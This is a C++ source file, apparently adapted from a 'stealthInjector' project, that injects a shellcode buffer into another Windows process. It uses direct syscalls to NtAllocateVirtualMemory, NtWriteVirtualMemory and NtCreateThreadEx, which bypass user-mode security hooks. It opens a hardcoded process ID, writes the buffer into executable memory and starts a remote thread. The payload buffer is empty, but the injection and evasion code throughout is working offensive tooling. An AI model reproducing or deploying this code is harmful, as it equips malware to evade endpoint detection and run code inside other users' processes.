/*
Credit: https://github.com/JohnWoodman/stealthInjector
*/

#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include "getSyscall.h"

#pragma comment(lib, "ntdll.lib")
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

using myNtAllocateVirutalMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);

using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, LPVOID BaseAddress, char* Buffer, ULONG RegionSize, PULONG numBytesWritten);

using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T ZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

char buf[] = "";

int main(int argc, char *argv[]) {
	LPVOID allocation_start;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPCSTR cmd;
	myNtAllocateVirutalMemory NtAllocateVirtualMemory;
	myNtWriteVirtualMemory NtWriteVirtualMemory;
	myNtCreateThreadEx NtCreateThreadEx;
	SIZE_T RegionSize = (SIZE_T)sizeof(buf);
	HANDLE hThread;
	HANDLE procHandle;

	char syscallStub_NtAlloc[SYSCALL_STUB_SIZE] = {};
	char syscallStub_NtWrite[SYSCALL_STUB_SIZE] = {};
	char syscallStub_NtCreate[SYSCALL_STUB_SIZE] = {};
	DWORD oldProtection = 0;

	// define NtAllocateVirtualMemory
	NtAllocateVirtualMemory = (myNtAllocateVirutalMemory)(LPVOID)syscallStub_NtAlloc;
	VirtualProtect(syscallStub_NtAlloc, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	// define NtWriteVirtualMemory
	NtWriteVirtualMemory = (myNtWriteVirtualMemory)(LPVOID)syscallStub_NtWrite;
	VirtualProtect(syscallStub_NtWrite, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	// define NtCreateThreadEx
	NtCreateThreadEx = (myNtCreateThreadEx)(LPVOID)syscallStub_NtCreate;
	VirtualProtect(syscallStub_NtCreate, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	// get syscall stubs
	GetSyscallStub("NtAllocateVirtualMemory", syscallStub_NtAlloc);
	GetSyscallStub("NtWriteVirtualMemory", syscallStub_NtWrite);
	GetSyscallStub("NtCreateThreadEx", syscallStub_NtCreate);

	allocation_start = nullptr;

	printf("[*] Injecting into remote process using direct syscalls\n\n");

	procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4568);
	NtAllocateVirtualMemory(procHandle, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(procHandle, allocation_start, buf, sizeof(buf), 0);
	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, procHandle, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);

}
